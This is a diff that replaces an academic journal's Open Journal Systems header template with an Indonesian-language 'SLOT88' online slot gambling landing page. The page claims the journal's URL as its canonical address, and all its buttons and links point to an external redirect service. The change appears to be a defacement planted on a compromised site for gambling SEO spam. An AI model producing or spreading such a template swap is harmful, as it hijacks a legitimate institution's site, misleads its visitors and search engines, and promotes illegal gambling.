@@ -1,177 +1,711 @@
-{**
- * header.tpl
- *
- * Copyright (c) 2013-2019 Simon Fraser University
- * Copyright (c) 2000-2019 John Willinsky
- * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
- *
- * Common site header.
- *}
-{strip}
-{if !$pageTitleTranslated}{translate|assign:"pageTitleTranslated" key=$pageTitle}{/if}
-{if $pageCrumbTitle}
-	{translate|assign:"pageCrumbTitleTranslated" key=$pageCrumbTitle}
-{elseif !$pageCrumbTitleTranslated}
-	{assign var="pageCrumbTitleTranslated" value=$pageTitleTranslated}
-{/if}
-{/strip}
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
-	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" lang="{$currentLocale|replace:"_":"-"}" xml:lang="{$currentLocale|replace:"_":"-"}">
+<!DOCTYPE html>
+<html amp lang="id">
 <head>
-	<meta http-equiv="Content-Type" content="text/html; charset={$defaultCharset|escape}" />
-	<meta name="google-site-verification" content="AveH0RvOnUPdEJ7Qi-xX5eFJ4T_i0ePXdLkFt966VDY" />
-	<title>{$pageTitleTranslated}</title>
-	<meta name="description" content="{$metaSearchDescription|escape}" />
-	<meta name="keywords" content="{$metaSearchKeywords|escape}" />
-	<meta name="generator" content="{$applicationName} {$currentVersionString|escape}" />
-	{$metaCustomHeaders}
-	{if $displayFavicon}<link rel="icon" href="{$faviconDir}/{$displayFavicon.uploadName|escape:"url"}" type="{$displayFavicon.mimeType|escape}" />{/if}
-	<link rel="stylesheet" href="{$baseUrl}/lib/pkp/styles/pkp.css" type="text/css" />
-	<link rel="stylesheet" href="{$baseUrl}/lib/pkp/styles/common.css" type="text/css" />
-	<link rel="stylesheet" href="{$baseUrl}/styles/common.css" type="text/css" />
-	<link rel="stylesheet" href="{$baseUrl}/styles/compiled.css" type="text/css" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,maximum-scale=1">
+    <meta http-equiv="content-language" content="id">
+    <link rel="canonical" href="https://jurnal.idbbali.ac.id/index.php/nawalavisual/">
 
-	<!-- Base Jquery -->
-	{if $allowCDN}<script type="text/javascript" src="//www.google.com/jsapi"></script>
-		<script type="text/javascript">{literal}
-			<!--
-			// Provide a local fallback if the CDN cannot be reached
-			if (typeof google == 'undefined') {
-				document.write(unescape("%3Cscript src='{/literal}{$baseUrl}{literal}/lib/pkp/js/lib/jquery/jquery.min.js' type='text/javascript'%3E%3C/script%3E"));
-				document.write(unescape("%3Cscript src='{/literal}{$baseUrl}{literal}/lib/pkp/js/lib/jquery/plugins/jqueryUi.min.js' type='text/javascript'%3E%3C/script%3E"));
-			} else {
-				google.load("jquery", "{/literal}{$smarty.const.CDN_JQUERY_VERSION}{literal}");
-				google.load("jqueryui", "{/literal}{$smarty.const.CDN_JQUERY_UI_VERSION}{literal}");
-			}
-			// -->
-		{/literal}</script>
-	{else}
-		<script type="text/javascript" src="{$baseUrl}/lib/pkp/js/lib/jquery/jquery.min.js"></script>
-		<script type="text/javascript" src="{$baseUrl}/lib/pkp/js/lib/jquery/plugins/jqueryUi.min.js"></script>
-	{/if}
+    <title>SLOT88 : Agen Slot 88 Online Resmi Terbaik Penyedia Link Slot Gacor Gampang Maxwin Hari Ini</title>
+    <meta name="description" content="SLOT88 merupakan daftar rekomendasi terbaik saat ini sebagai penyedia game slot gacor maxwin hari ini yang bisa anda mainkan melalui link login agen slot online resmi Indonesia.">
+    <meta name="robots" content="index, follow">
+    <meta name="page-locale" content="id,en">
+    <meta content="true" name="HandheldFriendly">
+    <meta content="width" name="MobileOptimized">
+    <meta property="og:title" content="SLOT88 : Agen Slot 88 Online Resmi Terbaik Penyedia Link Slot Gacor Gampang Maxwin Hari Ini">
+    <meta property="og:description" content="SLOT88 merupakan daftar rekomendasi terbaik saat ini sebagai penyedia game slot gacor maxwin hari ini yang bisa anda mainkan melalui link login agen slot online resmi Indonesia.">
+    <meta property="og:url" content="https://jurnal.idbbali.ac.id/index.php/nawalavisual/">
+    <meta property="og:site_name" content="Slot Gacor">
+    <meta property="og:author" content="Slot Gacor">
+    <meta property="og:image" content="https://iili.io/CzbT2lS.png">
+    <meta name="og:locale" content="ID_id">
+    <meta name="og:type" content="website">
+    <meta name="rating" content="general">
+    <meta name="author" content="Slot Gacor">
+    <meta name="distribution" content="global">
+    <meta name="publisher" content="Slot Gacor">
+    <script async src="https://cdn.ampproject.org/v0.js"></script>
+    <link rel="icon" type="/img/png" href="https://iili.io/K7A8SzQ.png">
+    <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&display=swap">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&display=swap" rel="stylesheet">
+  
+    <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebPage",
+    "name": "SLOT88 : Agen Slot 88 Online Resmi Terbaik Penyedia Link Slot Gacor Gampang Maxwin Hari Ini",
+    "url": "https://jurnal.idbbali.ac.id/index.php/nawalavisual/",
+    "description": "SLOT88 merupakan daftar rekomendasi terbaik saat ini sebagai penyedia game slot gacor maxwin hari ini yang bisa anda mainkan melalui link login agen slot online resmi Indonesia.",
+    "breadcrumb": {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": "1",
+          "item": {
+            "@type": "WebSite",
+            "@id": "https://jurnal.idbbali.ac.id/index.php/nawalavisual/",
+            "name": "Slot Gacor"
+          }
+        }
+      ]
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "Slot Gacor",
+      "logo": {
+        "@type": "imageObject",
+        "url": "https://epic-comeback-baby-parco-gov.pages.dev/logo.png"
+      }
+    }
+  }
+</script>
 
-	{call_hook|assign:"leftSidebarCode" name="Templates::Common::LeftSidebar"}
-	{call_hook|assign:"rightSidebarCode" name="Templates::Common::RightSidebar"}
-	{if $leftSidebarCode || $rightSidebarCode}<link rel="stylesheet" href="{$baseUrl}/styles/sidebar.css" type="text/css" />{/if}
-	{if $leftSidebarCode}<link rel="stylesheet" href="{$baseUrl}/styles/leftSidebar.css" type="text/css" />{/if}
-	{if $rightSidebarCode}<link rel="stylesheet" href="{$baseUrl}/styles/rightSidebar.css" type="text/css" />{/if}
-	{if $leftSidebarCode && $rightSidebarCode}<link rel="stylesheet" href="{$baseUrl}/styles/bothSidebars.css" type="text/css" />{/if}
+    <style amp-boilerplate>
+        body {
+            -webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+            -moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+            -ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+            animation: -amp-start 8s steps(1, end) 0s 1 normal both
+        }
 
-	{foreach from=$stylesheets item=cssUrl}
-		<link rel="stylesheet" href="{$cssUrl}" type="text/css" />
-	{/foreach}
+        @-webkit-keyframes -amp-start {
+            from {
+                visibility: hidden
+            }
 
-	<!-- Default global locale keys for JavaScript -->
-	{include file="common/jsLocaleKeys.tpl" }
+            to {
+                visibility: visible
+            }
+        }
 
-	<!-- Compiled scripts -->
-	{if $useMinifiedJavaScript}
-		<script type="text/javascript" src="{$baseUrl}/js/pkp.min.js"></script>
-	{else}
-		{include file="common/minifiedScripts.tpl"}
-	{/if}
+        @-moz-keyframes -amp-start {
+            from {
+                visibility: hidden
+            }
 
-	<!-- Form validation -->
-	<script type="text/javascript" src="{$baseUrl}/lib/pkp/js/lib/jquery/plugins/validate/jquery.validate.js"></script>
-	<script type="text/javascript">
-		<!--
-		// initialise plugins
-		{literal}
-		$(function(){
-			jqueryValidatorI18n("{/literal}{$baseUrl}{literal}", "{/literal}{$currentLocale}{literal}"); // include the appropriate validation localization
-			{/literal}{if $validateId}{literal}
-				$("form[name={/literal}{$validateId}{literal}]").validate({
-					errorClass: "error",
-					highlight: function(element, errorClass) {
-						$(element).parent().parent().addClass(errorClass);
-					},
-					unhighlight: function(element, errorClass) {
-						$(element).parent().parent().removeClass(errorClass);
-					}
-				});
-			{/literal}{/if}{literal}
-			$(".tagit").live('click', function() {
-				$(this).find('input').focus();
-			});
-		});
-		// -->
-		{/literal}
-	</script>
+            to {
+                visibility: visible
+            }
+        }
 
-	{if $hasSystemNotifications}
-		{url|assign:fetchNotificationUrl page='notification' op='fetchNotification' escape=false}
-		<script type="text/javascript">
-			$(function(){ldelim}
-				$.get('{$fetchNotificationUrl}', null,
-					function(data){ldelim}
-						var notifications = data.content;
-						var i, l;
-						if (notifications && notifications.general) {ldelim}
-							$.each(notifications.general, function(notificationLevel, notificationList) {ldelim}
-								$.each(notificationList, function(notificationId, notification) {ldelim}
-									$.pnotify(notification);
-								{rdelim});
-							{rdelim});
-						{rdelim}
-				{rdelim}, 'json');
-			{rdelim});
-		</script>
-	{/if}{* hasSystemNotifications *}
+        @-ms-keyframes -amp-start {
+            from {
+                visibility: hidden
+            }
 
-	{$additionalHeadData}
+            to {
+                visibility: visible
+            }
+        }
+
+        @-o-keyframes -amp-start {
+            from {
+                visibility: hidden
+            }
+
+            to {
+                visibility: visible
+            }
+        }
+
+        @keyframes -amp-start {
+            from {
+                visibility: hidden
+            }
+
+            to {
+                visibility: visible
+            }
+        }
+    </style>
+    <noscript>
+        <style amp-boilerplate>
+            body {
+                -webkit-animation: none;
+                -moz-animation: none;
+                -ms-animation: none;
+                animation: none
+            }
+        </style>
+    </noscript>
+    <style amp-custom>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0
+        }
+
+        :focus {
+            outline: 0
+        }
+
+        ::-webkit-scrollbar {
+            display: none
+        }
+
+        a,
+        a:after,
+        a:hover,
+        a:visited {
+            text-decoration: none;
+            color: #fff
+        }
+
+        html {
+            max-width: 500px;
+            margin: 0 auto;
+            background-color: #000;background-image:url(https://res-cloudinary-com.cdn.ampproject.org/ii/AW/s/res.cloudinary.com/ds4o7y1ma/image/upload/v1702610158/stars_fewiop.gif)
+        }
+
+        body {
+            color: #fff;
+            font-family: 'Noto Sans', arial, sans-serif
+        }
+
+        .slot-online{
+            display: grid;
+            justify-content: center;
+            padding: 10px;
+        }
+
+        .slot-online5k {
+            text-align: center;
+        }
+
+        .slotbonus {
+            display: grid;
+        }
+
+        .slotbonus .contole {
+            padding: .5rem 3.8rem;
+            background: #33333388;
+            margin-bottom: .5rem;
+            border-radius: .38rem;
+            box-shadow: 0 -1px #6813f188;
+            letter-spacing: 1px
+        }
+
+        .slotbonus a.btn1 {
+            color: #eee;
+            background-image: linear-gradient(-45deg, #eb9a00 0, #ffd000 100%);
+            box-shadow: none;
+            font-weight: 700
+        }
+
+        .slotbonus-container {
+            display: flex;
+            background: linear-gradient(-45deg, #eb9a00 0, #ffd000 100%);
+            width: 250px;
+            height: 40px;
+            align-items: center;
+            justify-content: space-around;
+            border-radius: 10px;
+        }
+
+        .slot-online {
+            outline: 0;
+            border: 0;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: transparent;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            transition: all ease-in-out .3s;
+            cursor: pointer
+        }
+
+        .slot-online:hover {
+            transform: translateY(-3px)
+        }
+
+        .btn2 {
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            overflow: hidden;
+            height: 3rem;
+            background-size: 300% 300%;
+            backdrop-filter: blur(1rem);
+            border-radius: .38rem;
+            transition: .5s;
+            animation: gradient_301 5s ease infinite;
+            border: double 4px transparent;
+            background-image: linear-gradient(#212121, #212121), linear-gradient(137.48deg, #eb9a00, #ffd000, #eb9a00, #ffd000, #eb9a00 87%);
+            background-origin: border-box;
+            background-clip: content-box, border-box
+        }
+
+        #container-stars {
+            position: absolute;
+            z-index: -1;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            transition: .5s;
+            backdrop-filter: blur(1rem);
+            border-radius: .38rem
+        }
+
+        strong {
+            z-index: 2;
+            letter-spacing: 5px;
+            color: #ffffff;
+            text-shadow: #fff
+        }
+
+        #glow {
+            position: absolute;
+            display: flex;
+            width: 12rem
+        }
+
+        .circle {
+            width: 100%;
+            height: 30px;
+            filter: blur(2rem);
+            animation: pulse_3011 4s infinite;
+            z-index: -1
+        }
+
+        .circle:nth-of-type(1) {
+            background: rgba(254, 83, 186, .636)
+        }
+
+        .circle:nth-of-type(2) {
+            background: rgba(142, 81, 234, .704)
+        }
+
+        .btn2:hover #container-stars {
+            z-index: 1;
+            background-color: #212121
+        }
+
+        .btn2:hover {
+            transform: scale(1.1)
+        }
+
+        .btn2:active {
+            border: double 4px #fe53bb;
+            background-origin: border-box;
+            background-clip: content-box, border-box;
+            animation: none
+        }
+
+        .btn2:active .circle {
+            background: #fe53bb
+        }
+
+        #stars {
+            position: relative;
+            background: 0 0;
+            width: 200rem;
+            height: 200rem
+        }
+
+        #stars::after {
+            content: "";
+            position: absolute;
+            top: -10rem;
+            left: -100rem;
+            width: 100%;
+            height: 100%;
+            animation: animStarRotate 90s linear infinite
+        }
+            #faq{
+            font-size:28px;
+        }
+        @media(min-width:768px) {
+            body {
+                font-size: var(--normal-font);
+
+            }
+
+            .container {
+                max-width: 98%;
+            }
+
+            .site-menu {
+                width: 20%
+            }
+            .slot{
+                display:block;
+                margin:0 auto;
+                max-width:98%;
+            }
+            .slot .content{
+                float: none;
+                width: 100%;
+                padding: 0;
+                flex: 0 0 100%;
+                max-width: 100%;
+                background-color: #121212;
+                margin:0 auto;
+                align-self:center;
+                text-align:center;
+            }
+        }
+
+        @media(min-width:1200px) {
+            .container {
+                width: 1170px
+            }
+        }
+
+        @media(min-width:992px) {
+            .container {
+                width: 992px
+            }
+        }
+
+        #stars::after {
+            background-image: radial-gradient(#fff 1px, transparent 1%);
+            background-size: 50px 50px
+        }
+
+        #stars::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -50%;
+            width: 170%;
+            height: 500%;
+            animation: animStar 60s linear infinite
+        }
+
+        #stars::before {
+            background-image: radial-gradient(#fff 1px, transparent 1%);
+            background-size: 50px 50px;
+            opacity: .5
+        }
+
+        @keyframes animStar {
+            from {
+                transform: translateY(0)
+            }
+
+            to {
+                transform: translateY(-135rem)
+            }
+        }
+
+        @keyframes animStarRotate {
+            from {
+                transform: rotate(360deg)
+            }
+
+            to {
+                transform: rotate(0)
+            }
+        }
+
+        @keyframes gradient_301 {
+            0% {
+                background-position: 0 50%
+            }
+
+            50% {
+                background-position: 100% 50%
+            }
+
+            100% {
+                background-position: 0 50%
+            }
+        }
+
+        @keyframes pulse_3011 {
+            0% {
+                transform: scale(.75);
+                box-shadow: 0 0 0 0 rgba(0, 0, 0, .7)
+            }
+
+            70% {
+                transform: scale(1);
+                box-shadow: 0 0 0 10px transparent
+            }
+
+            100% {
+                transform: scale(.75);
+                box-shadow: 0 0 0 0 transparent
+            }
+        }
+
+        .artikel {
+            text-align: justify;
+        }
+
+        .artikel p {
+            margin: 25px 0;
+        }
+
+        .artikel a {
+            color: #d1b743
+        }
+        
+        .artikel h1 {
+            color: #d1b743;
+            text-align: center;
+        }
+
+        .artikel h2 {
+            color: #eb9a00;
+            text-align: center;
+        }
+
+        .block-img {
+            position: relative;
+            margin: auto;
+            min-width: 100px;
+            background: linear-gradient(0deg, #000, #272727);
+            color: #fff;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+
+        .block-img:before,
+        .block-img:after {
+            content: '';
+            position: absolute;
+            right: -3px;
+            bottom: -3px;
+            background: linear-gradient(45deg, #eb9a00, #ffd000, #eb9a00, #ffd000, #eb9a00);
+            background-size: 400%;
+            width: calc(100% + 6px);
+            height: calc(100% + 6px);
+            z-index: -1;
+            animation: steam 5s linear infinite;
+            border-radius: 10px;
+        }
+
+        .block1 {
+            position: relative;
+            margin: auto;
+            min-width: 100px;
+            padding: 5px 10px;
+            background: linear-gradient(0deg, #ff9000, #000000);
+            color: #fff;
+            cursor: pointer;
+        }
+
+        .block1:before,
+        .block1:after {
+            content: '';
+            position: absolute;
+            right: -3px;
+            bottom: -3px;
+            background: linear-gradient(45deg, #eb9a00, #ffd000, #eb9a00, #ffd000, #eb9a00);
+            background-size: 400%;
+            width: calc(100% + 6px);
+            height: calc(100% + 6px);
+            z-index: -1;
+            animation: steam 5s linear infinite;
+            border-radius: 10px;
+        }
+
+        .block {
+            position: relative;
+            padding: 8px 10px;
+            background: linear-gradient(0deg, #000, #272727);
+            color: #fff;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+
+        .block:before,
+        .block:after {
+            content: '';
+            position: absolute;
+            right: -3px;
+            bottom: -3px;
+            background: linear-gradient(45deg, #eb9a00, #ffd000, #eb9a00, #ffd000, #eb9a00);
+            background-size: 400%;
+            width: calc(100% + 6px);
+            height: calc(100% + 6px);
+            z-index: -1;
+            animation: steam 5s linear infinite;
+        }
+
+        @keyframes steam {
+            0% {
+                background-position: 0 0;
+            }
+
+            50% {
+                background-position: 400% 0;
+            }
+
+            100% {
+                background-position: 0 0;
+            }
+        }
+
+        .block:after {
+            filter: blur(50px);
+        }
+
+        .footer {
+            text-align: center;
+            margin: 15px 0;
+        }
+
+        .footer a {
+            color: #d1b743
+        }
+        *{
+        -webkit-user-select: none;
+        -khtml-user-select: none;
+        -moz-user-select: -moz-none;
+        -o-user-select: none;
+        user-select: none;
+    }
+    .site-description {
+            background-color: #1669ff;
+            padding: 1%;
+        }
+    .site-description {
+            background-color: #052663
+        }
+
+     @media(max-width:575.98px) {
+            .download-apk-section amp-img {
+                width: 50px
+            }
+            .img amp-img{
+                max-width:180px;
+                display:block;
+                margin:0 auto;
+            }
+            .slot{
+                display:block;
+                margin:0 auto;
+                max-width:98%;
+            }
+            .slot .content{
+                float: none;
+                width: 100%;
+                padding: 0;
+                flex: 0 0 100%;
+                max-width: 100%;
+                background-color: #121212;
+                margin:0 auto;
+                align-self:center;
+                text-align:center;
+            }
+            .card{
+               display:inline-block;
+               width: 31%;
+               background: transparent;
+               border: none;
+               text-align: center;
+               position: relative;
+               padding:0.5%;
+            }
+        }
+        @media(max-width:575.98px) {
+            .slot{
+                display:block;
+                margin:0 auto;
+                max-width:98%;
+            }
+            .slot .content{
+                float: none;
+                width: 100%;
+                padding: 0;
+                flex: 0 0 100%;
+                max-width: 100%;
+                background-color: #121212;
+                margin:0 auto;
+                align-self:center;
+                text-align:center;
+            }
+            .card{
+               display:inline-block;
+               width: 48%;
+               background: transparent;
+               border: none;
+               text-align: center;
+               position: relative;
+               padding:0.5%;
+            }
+        }
+        @media(min-width:576px){
+            .card{
+               display:inline-block;
+               width: 23%;
+               background: transparent;
+               border: none;
+               text-align: center;
+               position: relative;
+               padding:0.5%;
+            }
+            .img{
+                display:block;
+                text-align:center;
+            }
+            .img amp-img{
+                max-width:250px;
+                display:block;
+                margin:0 auto;
+            }
+        }
+    </style>
 </head>
-<body id="pkp-{$pageTitle|replace:'.':'-'}">
-<div id="container">
 
-<div id="header">
-<div id="headerTitle">
-<h1>
-{if $displayPageHeaderLogo && is_array($displayPageHeaderLogo)}
-	<img src="{$publicFilesDir}/{$displayPageHeaderLogo.uploadName|escape:"url"}" width="{$displayPageHeaderLogo.width|escape}" height="{$displayPageHeaderLogo.height|escape}" {if $displayPageHeaderLogoAltText != ''}alt="{$displayPageHeaderLogoAltText|escape}"{else}alt="{translate key="common.pageHeaderLogo.altText"}"{/if} />
-{/if}
-{if $displayPageHeaderTitle && is_array($displayPageHeaderTitle)}
-	<img src="{$publicFilesDir}/{$displayPageHeaderTitle.uploadName|escape:"url"}" width="{$displayPageHeaderTitle.width|escape}" height="{$displayPageHeaderTitle.height|escape}" {if $displayPageHeaderTitleAltText != ''}alt="{$displayPageHeaderTitleAltText|escape}"{else}alt="{translate key="common.pageHeader.altText"}"{/if} />
-{elseif $displayPageHeaderTitle}
-	{$displayPageHeaderTitle}
-{elseif $alternatePageHeader}
-	{$alternatePageHeader}
-{elseif $siteTitle}
-	{$siteTitle}
-{else}
-	{$applicationName}
-{/if}
-</h1>
-</div>
-</div>
+<body>
+    <main>
+        <div class="macallan">
+            <div class="slot-online5k">
+              
+                <br>
+                <div class="block-img">
+                    <a href="https://jetlinkr.co/timbul" target="_blank" rel="noopener noreferrer nofollow">
+                        <amp-img height="900" width="900" layout="responsive" alt="alternatif Slot Gacor" src="https://iili.io/CzbT2lS.png"></amp-img>
+                    </a>
+                </div>
 
-<div id="body">
+                <div class="slotbonus">
+                    <a href="https://jetlinkr.co/timbul" target="_blank" rel="noopener noreferrer nofollow">
+                        <button class="btn2"><strong>"SITUS SLOT88 TERPERCAYA"</strong>
+                            <div id="container-stars">
+                                <div id="stars"></div>
+                            </div>
+                            <div id="glow">
+                                <div class="circle"></div>
+                                <div class="circle"></div>
+                            </div>
+                        </button>
+                    
 
-{if $leftSidebarCode || $rightSidebarCode}
-	<div id="sidebar">
-		{if $leftSidebarCode}
-			<div id="leftSidebar">
-				{$leftSidebarCode}
-			</div>
-		{/if}
-		{if $rightSidebarCode}
-			<div id="rightSidebar">
-				{$rightSidebarCode}
-			</div>
-		{/if}
-	</div>
-{/if}
+                    <a href="https://jetlinkr.co/timbul" target="_blank" rel="noopener noreferrer nofollow" class="block">DAFTAR SITUS SLOT88</a>
+                    <a href="https://jetlinkr.co/timbul" target="_blank" rel="noopener noreferrer nofollow" class="block">LOGIN SITUS SLOT88</a>
+                     <a href="https://jetlinkr.co/timbul" target="_blank" rel="noopener noreferrer nofollow" class="block">INFO RTP & BOCORAN ADMIN</a>
+      
+                     
+                    
+            </div> 
+        
 
-<div id="main">
-{include file="common/navbar.tpl"}
+           </div>
+              
 
-{include file="common/breadcrumbs.tpl"}
 
-<h2>{$pageTitleTranslated}</h2>
+            <div class="artikel">
 
-{if $pageSubtitle && !$pageSubtitleTranslated}{translate|assign:"pageSubtitleTranslated" key=$pageSubtitle}{/if}
-{if $pageSubtitleTranslated}
-	<h3>{$pageSubtitleTranslated}</h3>
-{/if}
+               <h2>SLOT88 : Agen Slot 88 Online Resmi Terbaik Penyedia Link Slot Gacor Gampang Maxwin Hari Ini</h2>
+               <p style="text-align: center;">SLOT88 merupakan daftar rekomendasi terbaik saat ini sebagai penyedia game slot gacor maxwin hari ini yang bisa anda mainkan melalui link login agen slot online resmi Indonesia.</p><br>
+            </div>
+        </div>
 
-<div id="content">
+        <hr>
+        <div class="footer">
+            &copy; SITUS GACOR | <a href="https://jurnal.idbbali.ac.id/index.php/nawalavisual/"> SEO ASAP</a>
+        </div>
+
+    </main>
+</body>
+</html>
